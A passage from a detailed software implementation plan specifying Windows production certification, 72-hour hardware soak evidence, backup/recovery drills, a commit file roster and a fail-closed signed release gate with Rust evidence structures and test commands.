Expected: PASS only with Task 7 continuous UPS safe shutdown, exact `P340_SINGLE_HDD_V1` HardwareEvidenceV1 (ThinkStation P340 Tower, Intel Core i5-10500, 32GB, one 256GB OS SSD, exactly one 1TB authority HDD), Secure Boot/TPM/BitLocker/UEFI/AMT/removable-media gates, Windows Server drivers, SMART/temperature/bad-sector checks, flush/power-loss test and 72-hour stability. The barrier load is exactly 15 Workbench + 3 customer portal + 2 supplier portal plus one separately reserved Control Center, with the simultaneous 11 read + 5 write + 2 high-risk + 2 attachment action mix, bursts, one due automation chain, incremental backup, audit checkpoint, health collection and one heavy report. Also require a signed malware definition age `<=72h` under trusted W32Time, emergency reserve, zero customer-content SSD writes, pinned PostgreSQL 16/base-WAL-PITR evidence and all three recovery roles. The signed manifest/capacity certificate records CPU/RAM/system identity, NTFS/filesystem, volume GUID/serial, physical disk/controller/firmware, logical/physical sector, cluster and write-cache/flush properties plus data size, HDD fill and 30/90-day growth. Any hardware change invalidates it and invokes the Task 7 new-profile/recertification protocol. A signed offline definition update is tested；stale/revoked/wrong-engine media remains quarantined.

This step creates `testkit/tests/f57_p340_capacity.rs` and `testkit/tests/f57_power_shutdown.rs` for the first time. Their exact ownership-seed symbols activate `NFR-001|NFR-003|NFR-005|NFR-007` only here；`cargo xtask f57check --task F57-24 --phase post-green` must execute those stable TestIDs against the signed real-server artifacts above. Synthetic Task 7 results, a missing 72-hour run, or a test binary that does not consume the real capacity/power evidence cannot satisfy the activation partition.

The 72-hour carrier is a separate signed `SignedBusinessArtifactV1<P340SoakEvidencePayloadV1>`，not a long-running CI command and not a reused eight-hour toolchain manifest. Its strict payload exact fields are `schema_version=1,purpose="EP-F57-P340-SOAK-EVIDENCE-V1",evidence_id,deployment_id,repository_tree_sha256,candidate_commit_id,package_sha256,generation,hardware_evidence_id,hardware_profile_id,postgres_build_sha256,configuration_digests[],started_at_utc,finished_at_utc,sample_period_seconds,sample_count,maximum_gap_seconds,sample_chain_root,workload_scenario_digest,backup_checkpoint_refs[],power_event_refs[],incident_refs[],final_reconciliation_digest,outcome="PASS"`；all objects reject unknown fields, digest/reference sets are canonical and the signer is authorized only by the production-capacity evidence roster. `cms_signing_time=finished_at_utc`。The run is at least 72 consecutive hours, samples every 60 seconds, permits no gap over 120 seconds, and executes the exact workload、burst、due automation、incremental backup、audit、health、heavy-report、HDD-fill/growth and controlled power-event scenario above. Each sample extends a hash chain over trusted wall/monotonic time、process and queue state、latency/resource measurements、final-handle storage destinations、SMART/temperature and active workload identities；the terminal reconciliation proves zero lost accepted command、zero duplicate effect、zero unexplained obligation、zero customer-linked SSD write and exact backup checkpoints.

`run-p340-certification.ps1` writes the verified envelope only to `target/f57-ci-input/production/F57-24/p340-soak.v1.json` and to the configured server-external append-only evidence target；neither copy is inside the repository tree. It starts only after the signed MSI for the clean Task 24 candidate is installed and verifies exact equality of tree、candidate commit、package、generation、hardware、PostgreSQL build and configuration digests at start and finish. Restart of an approved service or host does not erase the run: the durable hash-chain checkpoint resumes on the authority HDD and records a typed power event, but any unaccounted gap、clock rollback、evidence deletion、hardware/configuration/package/tree drift、wrong volume、failed backup/reconciliation or unresolved incident invalidates the whole artifact and restarts the 72-hour window.

After that envelope is finalized, Step 8 provisions a fresh toolchain manifest whose normal validity remains at most eight hours and runs the Task 24 full lane. The lane independently reloads the fixed soak path and server-external receipt, validates `f57-p340-soak-evidence.schema.json`、CMS/purpose/roster/time/hash chain, exact candidate identities and all referenced evidence, then executes `f57_p340_capacity` and `f57_power_shutdown` against it. Thus the short-lived CI identity verifies a completed long-duration observation without pretending to have remained valid for 72 hours. Any candidate or measured-configuration change between soak completion and the formal lane invalidates the evidence and requires a new soak.

The HDD-routing probe resolves final handles and stable volume IDs after open, including junction/reparse/mount/TOCTOU cases, and inventories hibernation, VSS, Windows Search, ETW, HTTP.sys/IIS, EDR, RDP, print spool, Prefetch/SysMain, PowerShell transcripts, clipboard/history, Recent/Jump Lists, thumbnail caches, SRUM and diagnostic channels. Each is explicitly HDD-routed or disabled. Defender/AMSI must prove that a detected canary and its identifiable path never enter C-drive Defender quarantine/Event Log; otherwise that carrier is uncertified and only a scanner satisfying `HDD_STRICT` may activate. Any customer-linkable path outside `ValidatedDataRoot` blocks go-live.

Run first on a clean recovery server: `powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/test-recovery-tool.ps1 -CleanHost`

Then run: `powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/backup-restore-drill.ps1`

Expected: PASS for all three distinct application-vault two-of-three combinations and all three distinct backup-envelope two-of-three combinations, failure of each single share, exact six-token/six-nonoverlapping-holder evidence, four-domain BitLocker-OS/BitLocker-data/application/backup separation and every reuse negative, clean-host recovery, lost/stolen-share rotation, crash-dump canary absence and locked-memory zeroization. The subsequent drill installs the pinned PostgreSQL engine, rebuilds/rewraps the encrypted TLS passphrase envelope for the new TPM, rejects a poisoned latest point, selects and verifies an older signed cut, proves post-cut attachment changes are excluded and pinned ciphertext survives GC, enforces retention-custodian non-shortening, and produces signed data-size-specific RPO/RTO plus full reconciliation；failure blocks real customer data.

- [ ] **Step 8: Verify transactional epoch, trusted IPC/time and conditional carriers**

The first two test commands below belong to the pre-commit local candidate suite described in Step 6 and must already have passed before the candidate was created: `cargo test -p ep-adapter-db-pg -p ep-adapter-ipc -p ep-platform-runtime -p ep-platform-command -p ep-platform-backup -p ep-adapter-backup -p recovery-tool -p pg-passphrase-helper -p backup-target -p core-server && cargo test -p ep-testkit --test f57_authority_fencing --test f57_ransomware_recovery --test f57_windows_time --test f57_windows_ipc --test f57_postgres16_recovery --test f57_backup_target --test f57_backup_envelope --test f57_recovery_cut --test f57_recovery_tool_windows --test f57_pg_tls --test f57_rfc3161_signing --test f57_windows_recovery_security --test f57_security_incident --test f57_residency --test f57_successor_ltsc_boundary -- --nocapture`。After the completed soak/recovery carriers exist and while the repository still equals that clean candidate, the administrator freshly attests/verifies the Task 24 toolchain, then runs the sole formal sequence `cargo xtask ci --lane windows-authority --task F57-24 --profile WINDOWS_PRODUCTION_FULL_F57_24_V1 && cargo xtask f57check --task F57-24 --phase post-green` within the new manifest's eight-hour validity.

Expected: PASS on Windows for real DB transaction fencing, pipe peer impersonation negatives, approved-source W32Time plus monotonic lease/backoff/timeout evidence, China-mainland residency, both exact AuthorityCarrier variants and every NFR-009 provider-root/tenant/vTPM/HDD/cache/snapshot/managed-component negative, honest successor-LTSC boundary, security-incident lifecycle, verified recovery-cut ordering/pins/certification state, quota/media exhaustion, ADR-0024 key-envelope KAT, application-encrypted real-target backup/PITR, PostgreSQL TLS helper fail-closed cases, native two-of-three recovery, internal-TSA RFC3161 negatives, signed Job Object worker and Hyper-V container host-capability probe. Anything but derived `CERTIFIED` blocks real data；`integration-gateway` and `backup-target` both have zero SQL session/attempt.

- [ ] **Step 9: Candidate commit roster (executed before Step 6)**

```bash
git add -- crates/foundation/src/port/backup.rs crates/foundation/src/port/mod.rs crates/foundation/src/lib.rs crates/platform/backup/Cargo.toml crates/platform/backup/src/lib.rs crates/platform/backup/src/envelope.rs
git add -- crates/platform/secrets/src/recovery_domain.rs crates/platform/secrets/tests/recovery_domain_manifest.rs
git add -- crates/platform/backup/src/key_envelope.rs crates/platform/backup/src/quota.rs crates/platform/backup/src/media_state.rs crates/platform/backup/src/certification.rs crates/platform/backup/src/store.rs crates/platform/backup/src/crypto.rs crates/platform/backup/src/manifest.rs
git add -- crates/platform/backup/src/topology.rs crates/platform/backup/src/rotation.rs crates/platform/backup/src/checkpoint.rs crates/platform/backup/src/checkpoint_signer.rs crates/platform/backup/src/recovery_cut.rs crates/platform/backup/tests/topology.rs
git add -- crates/platform/backup/tests/checkpoint_signer.rs crates/platform/backup/tests/recovery_cut.rs crates/platform/backup/tests/epb1_conformance.rs crates/platform/backup/tests/media_state.rs crates/platform/backup/tests/certification.rs crates/platform/backup/tests/fixtures/adr0021-epb1-v1.json crates/platform/backup/tests/fixtures/adr0024-backup-key-envelope-v1.json crates/adapter/backup/Cargo.toml crates/adapter/backup/src/lib.rs crates/adapter/backup/src/epb1.rs
git add -- crates/adapter/backup/src/crypto.rs crates/adapter/backup/src/append_only.rs crates/adapter/backup/src/offline_media.rs crates/adapter/backup/src/restore.rs crates/adapter/backup/src/postgres16.rs crates/adapter/backup/src/https_append_only.rs
git add -- crates/adapter/backup/src/checkpoint_signer.rs crates/adapter/backup/src/recovery_cut.rs crates/adapter/backup/tests/acl.rs crates/adapter/backup/tests/postgres16_pitr.rs crates/adapter/backup/tests/https_append_only.rs crates/adapter/backup/tests/recovery_cut.rs
git add -- crates/adapter/backup/tests/epb1_conformance.rs installer/windows/Product.wxs installer/windows/EnterprisePlatform.wixproj installer/windows/services.json installer/windows/firewall.json installer/windows/paths.json
git add -- installer/windows/postgresql16.lock.json installer/windows/postgresql16-tls-policy.json installer/windows/backup-target-service.json installer/windows/rfc3161-tsa-policy.json installer/windows/recovery-certification-policy.json scripts/windows/build-msi.ps1
git add -- scripts/windows/sign-artifacts.ps1 scripts/windows/verify-authenticode.ps1 scripts/windows/install-services.ps1 scripts/windows/configure-data-root.ps1 scripts/windows/install-postgres16.ps1 scripts/windows/configure-postgres16.ps1
git add -- scripts/windows/verify-postgres16.ps1 scripts/windows/verify-postgres16-tls.ps1 scripts/windows/archive-wal.ps1 scripts/windows/test-postgres16-pitr.ps1 scripts/windows/test-recovery-tool.ps1 scripts/windows/verify-rfc3161-timestamp.ps1
git add -- scripts/windows/verify-bitlocker.ps1 scripts/windows/verify-boot-security.ps1 scripts/windows/verify-service-acls.ps1 scripts/windows/verify-ipc.ps1 scripts/windows/verify-time.ps1 scripts/windows/verify-hdd-routing.ps1
git add -- scripts/windows/verify-residency.ps1 scripts/windows/verify-successor-ltsc-boundary.ps1 scripts/windows/run-p340-certification.ps1 scripts/windows/backup-restore-drill.ps1 scripts/windows/uninstall-services.ps1 docs/evidence/f57-p340-soak-evidence.schema.json Cargo.toml
git add -- Cargo.lock crates/platform/runtime/src/process.rs crates/platform/runtime/src/boot.rs crates/platform/runtime/src/selfcheck/items/basic.rs crates/platform/runtime/src/windows_time.rs crates/platform/runtime/src/residency.rs
git add -- crates/platform/runtime/src/successor_ltsc.rs crates/platform/runtime/src/lib.rs crates/platform/runtime/Cargo.toml crates/adapter/ipc/src/transport.rs crates/adapter/ipc/src/windows_pipe.rs crates/adapter/ipc/src/lib.rs
git add -- crates/adapter/ipc/Cargo.toml crates/adapter/ipc/tests/windows_pipe_security.rs apps/backup-writer/src/main.rs apps/backup-writer/src/config.rs apps/backup-writer/src/wiring/mod.rs apps/backup-writer/src/wiring/backup.rs
git add -- apps/backup-writer/src/targets.rs apps/backup-writer/Cargo.toml apps/archive-writer/src/main.rs apps/archive-writer/src/config.rs apps/archive-writer/src/wiring/mod.rs apps/archive-writer/src/wiring/archive.rs
git add -- apps/archive-writer/src/targets.rs apps/archive-writer/Cargo.toml apps/ops-agent/src/main.rs apps/ops-agent/src/config.rs apps/ops-agent/src/backup_evidence.rs apps/ops-agent/src/security_incident.rs apps/ops-agent/src/soak.rs
git add -- crates/platform/flow/src/security_incident.rs crates/platform/flow/src/lib.rs crates/platform/flow/Cargo.toml crates/adapter/db-pg/src/platform_ops/security_incidents.rs apps/core-server/src/platform/security_incidents.rs apps/core-server/src/platform/control_center.rs apps/core-server/src/platform/mod.rs
git add -- apps/core-server/src/wiring/business.rs clients/control-center/src/api/authority.ts clients/control-center/src/features/automations/IncidentDesk.tsx clients/control-center/src/features/operations/ProductionEvidence.tsx docs/openapi/control-center.v1.yaml docs/openapi/README.md
git add -- docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md docs/data-dictionary/platform_flow.md docs/event-catalog.md docs/metrics-catalog.md
git add -- apps/ops-agent/Cargo.toml apps/recovery-tool/Cargo.toml apps/recovery-tool/src/lib.rs apps/recovery-tool/src/main.rs apps/recovery-tool/src/piv.rs apps/recovery-tool/src/manifest.rs
git add -- apps/recovery-tool/src/ceremony.rs apps/recovery-tool/src/memory.rs apps/recovery-tool/src/windows_piv.rs apps/recovery-tool/src/windows_memory.rs apps/recovery-tool/tests/windows_ceremony.rs apps/pg-passphrase-helper/Cargo.toml
git add -- apps/pg-passphrase-helper/src/lib.rs apps/pg-passphrase-helper/src/main.rs apps/pg-passphrase-helper/src/policy.rs apps/pg-passphrase-helper/src/parent.rs apps/pg-passphrase-helper/src/unseal.rs apps/pg-passphrase-helper/tests/pre_db_tls.rs
git add -- apps/backup-target/Cargo.toml apps/backup-target/src/lib.rs apps/backup-target/src/main.rs apps/backup-target/src/config.rs apps/backup-target/src/authz.rs apps/backup-target/src/store.rs
git add -- apps/backup-target/src/server.rs apps/backup-target/tests/role_separation.rs crates/adapter/db-pg/src/platform_ops/authority_epoch.rs crates/adapter/db-pg/src/platform_ops/recovery_cut.rs crates/adapter/db-pg/src/platform_ops/backup_control.rs crates/adapter/db-pg/src/platform_ops/backup_sets.rs crates/adapter/db-pg/src/platform_ops/backup_manifests.rs crates/adapter/db-pg/src/platform_ops/backup_receipts.rs
git add -- crates/adapter/db-pg/src/platform_ops/offline_media.rs crates/adapter/db-pg/src/platform_ops/recovery_certification.rs crates/adapter/db-pg/src/platform_ops/mod.rs crates/adapter/db-pg/src/tx.rs
git add -- crates/adapter/db-pg/src/session.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml crates/platform/command/src/pipeline.rs apps/core-server/src/wiring/command.rs apps/core-server/Cargo.toml
git add -- db/migrations/platform_ops/V20261025093500__platform_ops_create_authority_epochs.sql db/migrations/platform_ops/V20261025093510__platform_ops_create_security_incidents.sql xtask/src/ci.rs xtask/src/codecheck.rs xtask/src/reproduce.rs xtask/src/sign.rs xtask/src/e2e.rs
git add -- .github/workflows/ci.yml .github/ci/pipeline-stages.tsv .github/ci/run-pipeline.sh .github/ci/verify-pipeline-commands.sh .github/ci/tests/run-negative.sh .github/ci/tests/rfc3161-negative.ps1
git add -- docs/ci-pipeline.md docs/config-reference.md scripts/verify-release.sh testkit/tests/f57_authority_fencing.rs testkit/tests/f57_ransomware_recovery.rs testkit/tests/f57_windows_time.rs
git add -- testkit/tests/f57_windows_ipc.rs testkit/tests/f57_postgres16_recovery.rs testkit/tests/f57_backup_target.rs testkit/tests/f57_backup_envelope.rs testkit/tests/f57_recovery_cut.rs testkit/tests/f57_recovery_tool_windows.rs
git add -- testkit/tests/f57_pg_tls.rs testkit/tests/f57_rfc3161_signing.rs testkit/tests/f57_windows_recovery_security.rs testkit/tests/f57_security_incident.rs testkit/tests/f57_residency.rs testkit/tests/f57_successor_ltsc_boundary.rs
git add -- testkit/tests/f57_p340_capacity.rs testkit/tests/f57_power_shutdown.rs testkit/tests/f57_control_center_contract.rs
git add -- testkit/Cargo.toml
git commit -m "feat: add windows production and ransomware recovery"
```

### Task 25: Prove fresh PostgreSQL 16, full traceability and signed release readiness

**Files:**
- Existing authoritative input: `docs/f57-task-ownership.seed.tsv`
- Existing authoritative input: `docs/f57-legacy-migration-disposition.seed.tsv`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Existing authoritative input: `docs/f57-fresh-pg-task-profiles.seed.tsv`
- Existing authoritative input: `docs/f57-ci-stage-registry.seed.tsv`
- Existing authoritative input: `docs/f57-ci-lane-task-profiles.seed.tsv`
- Existing authoritative input: `docs/evidence/f57-p340-soak-evidence.schema.json`
- Existing authoritative input: `docs/openapi/ai-admin.v1.yaml`
- Existing authoritative input: `docs/openapi/ai-reporting.v1.yaml`
- Existing authoritative input: `docs/openapi/control-center.v1.yaml`
- Existing authoritative input: `docs/openapi/employee-api.v1.yaml`
- Existing authoritative input: `docs/openapi/finance.v1.yaml`
- Existing authoritative input: `docs/openapi/invoice.v1.yaml`
- Existing authoritative input: `docs/openapi/ledger.v1.yaml`
- Existing authoritative input: `docs/openapi/mcp-management.v1.yaml`
- Existing authoritative input: `docs/openapi/portal.v1.yaml`
- Existing authoritative input: `docs/openapi/README.md`
- Create: `xtask/src/traceability.rs`
- Create: `xtask/src/windowscheck.rs`
- Create: `xtask/src/storagecheck.rs`
- Create: `xtask/src/clientcheck.rs`
- Create: `xtask/src/f57_release_gate.rs`
- Modify: `xtask/src/main.rs`
- Modify: `xtask/src/e2e.rs`
- Modify: `xtask/Cargo.toml`
- Modify: `tools/release-gate/src/main.rs`
- Modify: `tools/release-gate/Cargo.toml`
- Modify: `tools/bench/src/main.rs`
- Modify: `tools/bench/Cargo.toml`
- Create: `scripts/windows/test-fresh-pg16.ps1`
- Create: `db/migrations/platform_core/V20261025093600__platform_core_backfill_f57_unpoliced_table_registry.sql`
- Modify: `crates/adapter/db-pg/src/foundation_check.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `testkit/tests/f57_full_business_cycle.rs`
- Create: `testkit/tests/f57_fault_matrix.rs`
- Create: `testkit/tests/f57_fresh_pg16.rs`
- Create: `testkit/tests/f57_full_release_evidence.rs`
- Modify: `testkit/Cargo.toml`
- Create: `docs/evidence/f57-release-evidence.schema.json`
- Create: `docs/superpowers/reviews/f57-implementation-verification-template.md`

**Interfaces:**
- Consumes: every prior task, all F-57 requirement/TestID pairs, Windows evidence and the complete immutable machine-input roster: 185 ownership、310 legacy disposition、437 API discriminator、638 API component shape、218 component/state binding、65 state domain、47 direct route、23 FreshPG profile、11 CI stage and 25 CI lane/task profile rows.
- Produces: one non-skippable `cargo xtask f57-release-gate` and cryptographically signed `F57ReleaseEvidence`; this is the only path that can later change an implementation status to verified.

- [ ] **Step 1: Write the failing evidence-completeness test**

```rust
#[test]
fn release_evidence_verifier_accepts_only_exact_closed_synthetic_fixture() {
    let trace = load_f57_traceability().unwrap();
    let evidence = synthetic_valid_release_evidence_fixture(&trace);
    assert_eq!(trace.final_requirement_ids().len(), 185);
    assert_eq!(evidence.bindings.len(), 185);
    for requirement in trace.final_requirements() {
        let binding = evidence.binding_for(&requirement.id).expect("exact binding");
        assert_eq!(binding.test_id, requirement.test_id);
        assert_eq!(binding.evidence_id, requirement.evidence_id);
        assert_eq!(binding.result, EvidenceResult::Pass);
    }
    for mutation in every_missing_duplicate_wrong_task_generation_result_and_digest_mutation(&evidence) {
        assert!(verify_release_evidence_fixture(&trace, mutation).is_err());
    }
}
```

This TestID validates the release-evidence verifier with a closed synthetic fixture containing exactly 25 synthetic POST_GREEN receipts and the seed's exact 185 bindings. Synthetic refs use a dedicated fixture namespace and can never satisfy `--prepare`、`--verify` or a production evidence lookup. The test does not call `load_release_evidence()` and does not require a real Task 25 receipt. Real current-tree release evidence is assembled only by `f57-release-gate --prepare` after `f57check --all` has emitted and signed all 25 final-tree receipts；that prepare path is a direct consumer and never feeds its output back into the Task 25 receipt.

- [ ] **Step 2: Run in red state**

Run: `cargo xtask f57check --task F57-25 --phase pre-red && cargo test -p ep-xtask traceability && cargo xtask f57-release-gate`

Expected: FAIL because full evidence, real PostgreSQL, Windows, client and restore results are not yet registered.

- [ ] **Step 3: Implement a fail-closed release gate**

```rust
pub struct F57ReleaseEvidencePayloadV1 {
    pub schema_version: u32,
    pub purpose: String,
    pub issued_at: TrustedUtc,
    pub deployment_manifest_digest: Sha256Digest,
    pub generation: u64,
    pub task_gate_manifest: EvidenceRef,
    pub bindings: Vec<RequirementEvidenceBindingV1>,
    pub fresh_pg16: EvidenceRef,
    pub four_platform_clients: EvidenceRef,
    pub p340_capacity: EvidenceRef,
    pub p340_soak: EvidenceRef,
    pub storage_trace: EvidenceRef,
    pub trusted_w32time: EvidenceRef,
    pub scanner_definition_freshness: EvidenceRef,
    pub postgres16_clean_install: EvidenceRef,
    pub postgres_tls_pre_db: EvidenceRef,
    pub postgres_base_wal_pitr: EvidenceRef,
    pub recovery_cut: EvidenceRef,
    pub recovery_tool_2of3: EvidenceRef,
    pub append_only_target: EvidenceRef,
    pub rfc3161_signing: EvidenceRef,
    pub ransomware_restore: EvidenceRef,
    pub recovery_certification: EvidenceRef,
    pub mainland_residency: EvidenceRef,
    pub security_incident_readiness: EvidenceRef,
    pub successor_ltsc_boundary: EvidenceRef,
    pub security_review: EvidenceRef,
}

pub struct RequirementEvidenceBindingV1 {
    pub requirement_id: String,
    pub owner_task: String,
    pub activation_task: String,
    pub test_id: String,
    pub test_target_path: String,
    pub test_symbol: String,
    pub run_id: uuid::Uuid,
    pub result: EvidenceResult,
    pub output_digest: Sha256Digest,
    pub evidence_id: String,
    pub evidence_schema: String,
    pub platform_lane: PlatformLane,
    pub generation: u64,
}

pub type SignedF57ReleaseEvidenceV1 = SignedBusinessArtifactV1<F57ReleaseEvidencePayloadV1>;

pub struct TimestampedF57ReleaseEvidenceV1 {
    pub artifact: SignedF57ReleaseEvidenceV1,
    pub artifact_jcs_sha256: Sha256Digest,
    pub tsa_policy_sha256: Sha256Digest,
    pub rfc3161_token_der_b64url: CanonicalBase64Url,
}
```

The release gate treats the OpenAPI registry as an exact nine-file set. `control-center.v1.yaml`、`employee-api.v1.yaml`、`finance.v1.yaml`、`invoice.v1.yaml`、`ledger.v1.yaml` and `portal.v1.yaml` must be `CURRENT` + `IMPLEMENTED` with their owning Task 16/18/20/22 authority；`ai-admin.v1.yaml`、`ai-reporting.v1.yaml` and `mcp-management.v1.yaml` must remain explicitly historical/deferred/superseded and cannot expose a current route or implementation claim. `docs/openapi/README.md` is the sole machine-exact presence/title/version/status/source/ordered-task/state registry and must exact-match each YAML. The authority/supersession register is independently checked only for the same file's semantic class/status/source and ruling；it does not duplicate title/version metadata. Final discriminator materialization is exact: Control `1.2.0-f57=51/33` with `[F57-16,F57-23,F57-24]`, Employee `1.4.0-f57=230/102` with `[F57-18,F57-19,F57-20,F57-21,F57-23]`, and Portal `1.0.0-f57=10/11` with `[F57-22]`. Task 25 exact-compares all 437 discriminator rows/all eleven columns and all 638 component-shape rows/all eight seed columns against OpenAPI、Rust Task 6、generated TypeScript and the full stored `ComponentShapeRegistryV1`; it independently re-expands every profile/parameter/explicit-field row, exact-compares all 638 canonical schema digests and Rust paths, verifies every non-`NONE` operation code is already canonical in `docs/error-codes.md`, and rejects any missing/extra/future/stale schema or error member. It separately exact-compares all 218 component/state rows、all 65 state-domain enums and their current graph/derivation sources, plus every one of the 47 eleven-column direct routes and 111 expanded direct components—including each literal complete `error_code_set` and multi-profile same-digest rule—against OpenAPI、Rust、generated clients and the stored `DirectRouteRegistryV1`. The same final-tree gate exact-verifies the 23 FreshPG、11 CI-stage and 25 CI-profile rows before accepting their evidence. Every current operation or schema-only component must map to a registered command/query/result/error and strict schema. Unknown/missing/extra files、integer/prose task IDs、remaining `PLANNED_CREATE`、stale pending/version status、one-sided activation、false implemented status、generic proxy or a path in a `SCHEMA_COMPONENTS_ONLY` booklet fails release. Task 25 validates this set and never silently edits it.

Registry conformance tests include missing `info.title`、missing/invalid `info.version`、integer or prose/duplicate/out-of-order task IDs、premature planned file、missing current file、one-sided README/YAML/authority activation、stale version after variant addition、unknown extra YAML and an authority semantic mismatch. Each negative must fail before server/client generation.

The release artifact reuses Task 2/F-56 `SignedBusinessArtifactV1` strict JCS/digest/detached-CMS/offline-chain/full-CRL verifier; it has no free-form algorithm or raw-signature alternative. The outer timestamp token has `messageImprint=SHA-256(JCS(artifact))`, is a canonical DER RFC3161 `TimeStampToken`, and verifies only against Task 24's customer-approved internal TSA policy/chain/CRL/trusted time. This avoids self-reference while proving the signed evidence existed at `genTime`.

The gate first loads `task_gate_manifest` and exact-verifies `SignedBusinessArtifactV1<F57TaskGateManifestPayloadV1>` against every Task 1 JSON Schema explicitly listed in **Files** plus the CI signing-policy TOML instance, CI trust bundle and current final tree/plan/seed digests；the schema roster itself is exact, so a missing, extra or unlisted schema fails. It must contain exactly 25 valid POST_GREEN receipts in F57-01…F57-25 order；each receipt must bind the same final tree and current toolchain/execution-context/TestID/result/lane evidence, not an earlier task commit. The gate independently verifies every receipt's `F57ToolchainExecutionManifestV1`、`F57ExecutionContextPayloadV1`、`F57TestResultManifestPayloadV1` digest、stored due `ComponentShapeRegistryV1`、stored due `DirectRouteRegistryV1` and every `RequirementEvidenceBindingV1`、the exact 15-row objective-definition artifact/runtime export and the logical-lane→signed-artifact exact map；it also loads and schema-validates exactly 23 FreshPg artifacts for `F57-01..F57-14,F57-16,F57-18..F57-25`, matches each artifact's task/tree/execution context/TestResult digest to its receipt, verifies `outcome=PASS` and completed drop evidence, and requires null FreshPg refs for F57-15/17. Only then may it assemble the bindings into release evidence. It exact-partitions all 185 requirement bindings by activation task against `docs/f57-task-ownership.seed.tsv` and its owning receipt；it rejects duplicate/unbound IDs, mismatched task/path/symbol/lane/evidence schema, missing run/result/digest, a result from the wrong generation, receipt/toolchain/context/result/FreshPg/component-shape/direct-route/state-authority digest disagreement or any separate parallel requirement/TestID/EvidenceID array. For a main current requirement, `PASS` means the stated behavior and negative cases ran. For a `DEFERRED_WITH_INTERFACE` or `OUT_OF_SCOPE` boundary row, `PASS` means its present seam/registry/disabled-surface/false-claim negatives passed—not that the deferred capability exists. No boundary may be promoted by inference.

The gate loads `p340_soak` through `docs/evidence/f57-p340-soak-evidence.schema.json` and the shared bytes-first CMS verifier, then exact-matches its tree、candidate commit、package、generation、hardware、PostgreSQL build、configuration、capacity and power references to Task 24's receipt/lane evidence. It independently recomputes the duration/sample-count/gap/hash-chain constraints, reloads every referenced backup/power/incident/final-reconciliation artifact and requires the server-external append-only receipt. A prose “72 hours passed”、CI job duration、missing sample, unresolved incident, or a soak from another candidate cannot satisfy this field.

The gate fails for a missing/invalid/non-25-row task-gate manifest, skipped/ignored database tests, empty E2E, unsigned/stale/untimestamped evidence, unavailable or wrong/expired/revoked TSA, missing Windows/macOS-iOS/Android lane, stale generation, local AI artifact, Linux production carrier, cross-border/unknown residency, SSD customer write, missing/invalid P340 soak evidence, scanner outcome other than clean with signed definition age `<=72h`, missing approved-source W32Time/offset/last-sync plus monotonic evidence, missing continuous UPS/power evidence, missing emergency reserve, missing pinned clean PostgreSQL 16 installation, TLS PEM/passphrase outside HDD secrets or a bypassed service-bound helper, base backup not completed and `pg_verifybackup`-verified before the cut, target LSN below base end/`minRecoveryPoint`, WAL gaps, mutable cut/attachment Merkle mismatch, missing ciphertext receipts or failed pin/retention lease, ADR-0024/KAT failure, any single-share recovery success, failure of any valid two-share combination, recovery secret in dump/log, missing `CONTINUOUS_APPEND_ONLY|OFFLINE_ROTATION|RECOVERY_MATERIAL`, retention shortening, target plaintext, missing application-encrypted real-target transfer, poisoned-latest/multi-generation clean restore failure, expired/invalid recovery certification, security-incident state shown green without evidence or any `NOT_IMPLEMENTED` requirement claimed as verified. Hyper-V container code/conformance is mandatory; lack of host capability is acceptable only with activation disabled and `HOST_CAPABILITY_UNAVAILABLE` evidence.

- [ ] **Step 4: Prove every migration on a newly created PostgreSQL 16 database**

`scripts/windows/test-fresh-pg16.ps1` creates a uniquely named empty PostgreSQL 16 database from `EP_TEST_PG16_ADMIN_URL`, applies the complete catalog through `20261025093600` with `ep-migrate`, runs `f57_fresh_pg16`, then drops only that named database. The Rust test is a normal non-ignored target and absence of the URL/server is failure. Query `pg_catalog` for every expected table/column/type/constraint/index/trigger/function/RLS policy, verify `zero unregistered unpoliced table` after the final backfill, run positive/negative repository fixtures and prove migration versions are exactly increasing. Directory/SQL-text/history-row inspection is not evidence.

Run: `powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/test-fresh-pg16.ps1`

Expected: PASS on fresh PostgreSQL 16 with all 42 F-57 migrations, every historical retained migration, zero ignored test, zero missing RLS/registry entry and zero lower-version pending migration.

- [ ] **Step 5: Run the full closed-loop and fault scenarios**

```rust
#[tokio::test]
async fn customer_lifecycle_remains_closed_across_change_return_and_service() {
    let cycle = run_full_cycle().await.unwrap();
    assert_eq!(cycle.open_unexplained_obligations, 0);
    assert_eq!(cycle.unreconciled_financial_facts, 0);
    assert_eq!(cycle.duplicate_effects, 0);
    assert!(cycle.audit_chain_valid);
    assert!(cycle.every_metric_has_evidence);
}
```

Run: `cargo test --workspace && cargo test -p ep-testkit --test f57_full_business_cycle --test f57_fault_matrix --test f57_fresh_pg16 --test f57_full_release_evidence -- --nocapture`

Expected: PASS for duplicate requests, concurrent approvals, stale permissions, network loss, full disk, bad attachment, plugin crash, provider unknown, queue restart, power loss, backup rejection, restore, generation rollback and cycle reopen.

- [ ] **Step 6: Run the exact offline-aggregate → isolated-sign → offline-verify gate**

On the offline aggregation runner run the frontend build/scan commands first and create the clean Task 25 candidate commit. The private CI adapter must then regenerate its job matrix only from rows F57-01…F57-24 in `docs/f57-ci-lane-task-profiles.seed.tsv` and invoke, for every row and every index `i`, exact `cargo xtask ci --lane <execution_lanes_json[i]> --task <task_id> --profile <lane_profile_id>` on the registered runner；this is 20 ordinary single-lane profiles、3 four-lane task matrices (F57-17/18/22) and the one Task 24 full single-lane profile, all on the same Task 25 candidate tree. No previous task-commit artifact or “latest” lookup is accepted. After all those artifacts verify, run the terminal sequence: `cargo xtask ci --lane evidence-aggregate --task F57-25 --profile OFFLINE_RELEASE_AGGREGATE_F57_25_V1 && cargo xtask f57-client-gate aggregate --final-tree && cargo xtask f57check --all --phase post-green && cargo xtask f57-release-gate --check-task-gates --evidence-root target/f57-ci-evidence && cargo xtask f57-release-gate --prepare --evidence-root target/f57-ci-evidence --out target/f57-release/release-payload.v1.jcs`。The pre-commit local candidate suite is exactly `npm --prefix clients/control-center ci && npm --prefix clients/control-center test -- --run && npm --prefix clients/control-center run build && 